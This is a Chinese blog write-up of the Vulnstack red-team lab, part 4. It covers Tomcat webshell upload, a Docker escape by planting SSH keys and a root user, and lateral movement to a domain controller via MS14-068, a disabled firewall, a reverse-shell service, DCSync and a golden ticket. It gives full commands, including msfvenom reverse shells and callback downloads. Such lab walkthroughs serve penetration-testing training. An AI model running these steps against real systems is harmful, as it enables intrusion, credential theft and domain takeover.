    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑如下：</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png" alt="ATT-CK-2.png"></p><p>IP如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali linux  192.168.150.141</span><br><span class="line">web(ubuntu) 192.168.150.160(外) 192.168.183.128(内)</span><br><span class="line">win7        192.168.183.129</span><br><span class="line">DC(win2008) 192.168.183.130</span><br></pre></td></tr></table></figure><p>进入<code>WEB</code>主机，需要手动使用<code>docker</code>开启服务，分别是<code>strtus2-045</code>、<code>cve-2017-12615</code>、<code>cve-2018-12613</code><br>使用<code>docker</code>需要使用<code>sudo</code>否则没有权限使用，开启后情况如下</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>我们先用<code>nmap</code>扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br></pre></td></tr></table></figure><p>扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/nmap# nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br><span class="line">Failed to open normal output file nmap/vulnstack4.nmap for writing</span><br><span class="line">QUITTING!</span><br><span class="line">root@kali:~/nmap# cd ..</span><br><span class="line">root@kali:~# nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 09:40 CST</span><br><span class="line">Nmap scan report for 192.168.150.160</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)</span><br><span class="line">|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)</span><br><span class="line">|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)</span><br><span class="line">|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)</span><br><span class="line">2002/tcp open  http    Apache Tomcat 8.5.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/8.5.19</span><br><span class="line">MAC Address: 00:0C:29:57:73:39 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问<code>http://192.168.150.160:2002/</code>发现是<code>Tomcat</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png" alt="Tomcat"></p><p>利用<code>CVE-2017-12615</code>直接<code>put</code>一个冰蝎马上去</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png" alt="attck4-3.png"></p><p>这里有几点需要<strong>注意</strong>的：</p><ol><li>将<code>GET</code>请求改为<code>PUT</code></li><li>上传<code>shell</code>的名称后面需要加上<code>/</code>，比如，<code>/shell.jsp/</code></li><li>在最后加上要上传的内容，即shell</li></ol><p>访问<code>http://192.168.150.160:2002/shell.jsp</code>，<code>shell</code>已经成功上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png" alt="attck4-4.png"></p><p>使用冰蝎成功连接，是<code>root</code>权限</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck45.png" alt="attck45.png"></p><h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>首先搜索一下<code>apache tomcat</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit apache tomcat</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">                                                                                            | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                  | exploits/cgi/webapps/35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service               | exploits/unix/dos/22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tomcat - Denial of Service                             | exploits/multiple/dos/31615.rb</span><br><span class="line">Apache Tomcat (Windows) - &#x27;runtime.getRuntime().exec()&#x27; Local Privilege Escalation          | exploits/windows/local/7264.txt</span><br><span class="line">......</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#x27;utf8&#x27; Directory Traversal                                         | exploits/unix/remote/14489.c</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#x27;utf8&#x27; Directory Traversal (PoC)                                   | exploits/multiple/remote/6229.txt</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/jsp/webapps/42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/windows/webapps/42953.txt</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck47.png" alt="attck47.png"></p><p>找到一个可用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/jsp/webapps/42966.py</span><br></pre></td></tr></table></figure><p>将payload复制到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m exploits/jsp/webapps/42966.py</span><br><span class="line">  Exploit: Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/42966</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py</span><br><span class="line">File Type: Python script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/42966.py</span><br></pre></td></tr></table></figure><p>然后可以使用<code>42966.py</code>脚本</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck48.png" alt="attck48.png"></p><p>用<code>-u</code>参数检测是否存在漏洞</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck49.png" alt="attck49.png"></p><p>存在漏洞，访问<code>http://192.168.150.160:2002/Poc.jsp</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck410.png" alt="attck410.png"></p><p>我们就用自带的工具利用漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.150.160:2002/ -p pwn</span><br></pre></td></tr></table></figure><p>!<img src="http://www.sectime.top:8888/images/2020/05/15/attck411.png" alt="attck411.png"></p><p>可看到成功了，并返回一个shell</p><p>然后我们去访问上传的<code>pwn.jsp</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck412.png" alt="attck412.png"></p><p>在输入框中可执行命令</p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>参考：<a href="https://daolgts.github.io/2019/10/07/docker%E5%AE%89%E5%85%A8/">docker安全</a></p><p>使用<code>cve-2019-5736</code>实现<code>docker</code>逃逸  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">EXP</a></p><p>下载后编辑<code>main.go</code>，将命令改为如下反弹<code>shell</code>命令</p><p>6</p><p>使用<code>go</code>语言编译，得到<code>main</code>文件</p><p>通过冰蝎上传<code>main</code>文件，一执行就卡死，于是反弹<code>shell</code>到<code>kali</code><br>使用冰蝎反弹<code>shell</code>到<code>msf</code>，反弹<code>meterpreter</code>发现进不了<code>shell</code>也无法执行文件，直接反弹<code>shell</code>不能接收</p><p>于是使用另外的方式反弹<code>shell</code>，首先使用<code>msf</code>生成一个反弹<code>shell</code>的后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.150.141 LPORT=5555 -f raw &gt; shell1.jsp</span><br></pre></td></tr></table></figure><p>然后将它通过冰蝎上传到网站根目录<code>/usr/local/tomcat/webapps/ROOT/</code>，执行成功反弹<code>shell</code>，然后运行<code>main</code></p><p>输入框中执行<code>ls /dev</code>，可以看到docker虚拟的硬盘</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck413.png" alt="attck412.png"></p><p>我们试一下挂载</p><p>在根目录创建一个<code>test</code>文件夹，<code>mkdir /test</code></p><p><code>mount /dev/sda1 /test</code>，看一下是否挂载成功，<code>ls /test</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck414.png"></p><p>挂载成功</p><p>我们查看一下<code>/home</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck415.png"></p><p>查看隐藏文件，<code>ls -lah /test/home/ubuntu</code>，可以看到<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck416.png"></p><p>查看<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck417.png"></p><p>接下来我们就利用ssh实现docker逃逸</p><p><code>ssh-keygen -f kali</code>生成私钥</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck418.png"></p><p><code>chmod 600 kali</code>，不然用不了</p><p>这里我们写一个<code>test.sh</code>脚本，方便执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl13XtnQ/CEiD7SZLBXR8sbpEb7aXb3CMMpCZabybfg1eXitxiT+V7ypF1v8yjlRVGk7LqVeCD1nGI5d/VaDSW3fqe6fxZBH+8nAuuWbt6oEdkndaDuPgSHBZSkGJDQsePq9WOQ1tNUx7v2Jg7pMuIdd9kTQOVgK4xL2KGxddTwmpJCkv1gNn6Vd99ASWLIRKPNYdLvQ4lGAn6gPz39LBfDXaU8ri93HA75IIzz+7nXETfkx6x82vr0GuEmJBmqRRHxAQo8zAl3XC+X/tkPrSCr4OH26Rt3dQ9EL+eJJI8hSpWxGfC2uvauFQ8Brx+SuSnUAO9RevbAUyQDXyuI8LXu3vJL2Grw2tb9FDsIAEHtHUZ8o4od6xhyWThiv2hrL8nKHXzpuypTZ6WCznP6inYaCOFpChtU01kHptmzBreNy33HveKxMjKd5338dB4zSaIaaNqPKizjoejk7oRBJkuGyqecrwL3ReToj+FM02QnjK1kESpEspMTuOF5m6vwL0= kali@kali&#x27; &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /test/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>保存，开启一个http服务，在目标下载</p><p><code>python -m SimpleHTTPServer</code></p><p>在输入框下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.150.141:8000/test.sh</span><br></pre></td></tr></table></figure><p><code>chmod 777 test.sh</code> ，<code>ls -la</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck419.png"></p><p>执行<code>test.sh</code>，<code>bash test.sh</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck420.png"></p><p>在<code>kali</code>上用<code>ssh</code>连接一下，并没有什么用，因为我们不知道密码。。。。</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck421.png"></p><p>那么我们该怎么办呢？可以添加用户，但不能在输入框中添加，否则添加用户到了<code>docker</code></p><p>这里我们可以修改配置文件也可以添加用户</p><p>写个脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /test/etc/passwd</span><br><span class="line">chmod 777 /test/etc/shadow</span><br><span class="line">chmod 777 /test/etc/sudoers</span><br><span class="line">mkdir /test/home/kali</span><br><span class="line">chmod 777 /test/home/kali</span><br><span class="line">echo &#x27;kali:x:1001:1000:kali,,,:/home/kali:/bin/bash&#x27; &gt;&gt; /test/etc/passwd</span><br><span class="line">echo &#x27;kali:$6$dZhS1PQKuhRB3dMq$GVQsHMiD7221rqrnfxGxP6X9Pn271DJ2N299OHzWPoR6SmSQnk7mSK96BP9ZETvqkfFs1HFbMWkxD9kCSX10H1:18397:0:99999:7:::&#x27; &gt;&gt; /test/etc/shadow</span><br><span class="line">echo &#x27;kali  ALL=(ALL:ALL)  ALL&#x27; &gt;&gt; /test/etc/sudoers</span><br><span class="line">cat /test/etc/shadow</span><br></pre></td></tr></table></figure><p>输入框下载，<code>chomd 777 adduser.sh</code>，执行<code>bash adduser.sh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck422.png"></p><p>在<code>kali</code>上登录</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck423.png"></p><p>这里需要注意几点：</p><ol><li><code>ssh -i kali ubuntu@192.168.150.160</code>必须在<code>kali</code>上的<code>kali</code>用户下执行</li><li><code>sudoers</code>文件的权限只能是只读，上面我们改成<code>777</code>，需要把它改成<code>440</code></li><li><code>sudo -s</code>提升权限到<code>root</code></li></ol><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>利用<code>chisel</code>搭建代理</p><p><a href="https://xax007.github.io/2019/04/12/pivoting-with-chisel.html">https://xax007.github.io/2019/04/12/pivoting-with-chisel.html</a></p><p>目标机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ./chisel server -p 9001 --socks5</span><br></pre></td></tr></table></figure><p>kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ./chisel client 192.168.150.160:9001 socks</span><br></pre></td></tr></table></figure><p>上大杀器<code>metasploit</code>，利用<code>ms17-010</code>，返回<code>meterpreter</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck443.png" alt="attck443.png"></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>getuid</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p><code>ps </code>查看应用创建的服务</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck424.png" alt="attck424.png"></p><p>输入<code>shell</code>，进入系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2108 created.</span><br><span class="line">Channel 1 created.</span><br></pre></td></tr></table></figure><p><code>net view</code>，存在<code>demo</code>域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view /domain</span><br><span class="line">net view /domain</span><br><span class="line">Domain</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DEMO                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net view /domain:demo</code>查看域内机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view /domain:demo</span><br><span class="line">net view /domain:demo</span><br><span class="line">Server Name            Remark</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">\\TESTWIN7-PC   </span><br><span class="line">\\WIN-ENS2VR5TR3N                                                              </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net group &quot;domain ontrollers&quot; /domain</code>查看域控</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck425.png" alt="attck425.png"></p><p>出现这种情况，首先<code>exit</code>退出shell，然后<code>steal_token 进程号</code> ，再<code>shell</code>进入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck426.png" alt="attck426.png"></p><p>域控：\\WIN-ENS2VR5TR3N </p><p><code>wmic computersystem get domain</code>查看完整域名</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck427.png" alt="attck427.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>查看域内管理员</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck428.png" alt="attck428.png"></p><p><code>net group &quot;domain users&quot; /domain</code> 查看域内用户</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck429.png" alt="attck429.png"></p><p><code>nslookup \\WIN-ENS2VR5TR3N  </code> 查看域控IP</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck430.png" alt="attck430.png"></p><p><code>whoami /all</code>获取用户<code>SID</code>: <code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck431.png" alt="attck431.png"></p><p>域的<code>SID</code>，用户<code>SID</code>去掉最后的<code>-</code>及其后面的，即<code>S-1-5-21-979886063-1111900045-1414766810</code></p><p>信息收集到这就差不多了，当然越详细越好。</p><p><strong>抓密码</strong></p><p><code>rev2self</code>提升权限，调用<code>kiwi</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck432.png" alt="attck432.png"></p><p><code>creds_all</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck433.png" alt="attck433.png"></p><p><strong>注意：</strong> 因为登录过域成员，所以密码是明文</p><p>如果没有登录过，可以用上面的<code>NTLM hash</code></p><p><code>systeminfo</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck434.png" alt="attck434.png"></p><p>我们可以利用<code>mss14-068</code>，搜索其补丁号，若没有打补丁，说明漏洞存在</p><p>这个靶场做的很贴心，里面有很多工具，若没有，我们可以自己上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck435.png" alt="attck435.png"></p><p>开搞！！！</p><p>假如我们想查看域控的C盘根目录<code>dir \\WIN-ENS2VR5TR3N\c$</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck436.png" alt="attck436.png"></p><p>发现不行，我们要使用<code>MS17-068</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck437.png" alt="attck437.png"></p><p>生成了一个票据，用<code>mimikatz</code>导入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck438.png" alt="attck438.png"></p><p>再次执行<code>dir \\WIN-ENS2VR5TR3N\c$</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck439.png" alt="attck439.png"></p><p>远程执行命令</p><p>创建关闭防火墙的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ProtectFirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck440.png" alt="attck440.png"></p><p>制作反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6001 -f exe-service -o update.exe</span><br></pre></td></tr></table></figure><p>上传到域成员douser，查看当前目录<code>pwd</code>，<code>upload update.exe</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck445.png" alt="attck445.png"></p><p>创建反弹shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create Shell binpath= &quot;C:\update.exe&quot;</span><br></pre></td></tr></table></figure><p>设置监听，先不执行</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck444.png" alt="attck444.png"></p><p>执行关闭防火墙的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start ProtectFirewall</span><br></pre></td></tr></table></figure><p>虽然提示失败了，但是防火墙确实关闭了</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck441.png" alt="attck441.png"></p><p>执行反弹shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start Shell</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck446.png" alt="attck446.png"></p><p>开启监听，shell弹回来，拿到域控的shell</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck447.png" alt="attck447.png"></p><p>接下来，我们可以抓key，构造黄金令牌</p><p><code>load kiwi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure><p><code>help</code>可以帮助我们查看<code>command</code>文档</p><p><code>dcsync_ntlm</code> 来还原<code>krbtgt</code>的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[!] Running as SYSTEM, function will not work.</span><br></pre></td></tr></table></figure><p>出现这种情况，我们需要伪造administrator，然后再执行<code>dcsync_ntlm krbtgt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token 1952</span><br><span class="line">Stolen token with username: DEMO\administrator</span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 7c4ed692473d4b4344c3ba01c5e6cb63</span><br><span class="line">[+] LM Hash   : 4d81a5d6b591f0710e75884e5ef9cba2</span><br><span class="line">[+] SID       : S-1-5-21-979886063-1111900045-1414766810-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure><p><code>golden_ticket_create</code>构造黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d demo.com -u Administrator -s S-1-5-21-979886063-1111900045-1414766810 -k 7c4ed692473d4b4344c3ba01c5e6cb63 -t /home/kali/kali.tck</span><br><span class="line">[+] Golden Kerberos ticket written to /home/kali/kali.tck</span><br><span class="line"></span><br><span class="line">参数介绍</span><br><span class="line">-t /home/kali/kali.tck</span><br><span class="line">-d  域名</span><br><span class="line">-u  要伪造的用户</span><br><span class="line">-s  域SID</span><br><span class="line">-k  krbtge的ntlm</span><br><span class="line">-t  保存的本地路径</span><br></pre></td></tr></table></figure><p>导入黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eter &gt; kerberos_ticket_use /home/kali/kali.tck</span><br><span class="line">[*] Using Kerberos ticket stored in /home/kali/kali.tck, 1820 bytes ...</span><br><span class="line">[+] Kerberos ticket applied successfully.</span><br></pre></td></tr></table></figure><p>查看域控的c盘根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"> Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.</span><br><span class="line"> Volume Serial Number is 702B-0D1B</span><br><span class="line"></span><br><span class="line"> Directory of \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020/01/24  13:30    &lt;DIR&gt;          Program Files</span><br><span class="line">2020/01/24  13:30    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020/05/16  11:39            48,640 update.exe</span><br><span class="line">2019/12/31  11:01    &lt;DIR&gt;          Users</span><br><span class="line">2020/01/24  13:33    &lt;DIR&gt;          Windows</span><br><span class="line">               1 File(s)         48,640 bytes</span><br><span class="line">               5 Dir(s)  12,438,585,344 bytes free</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
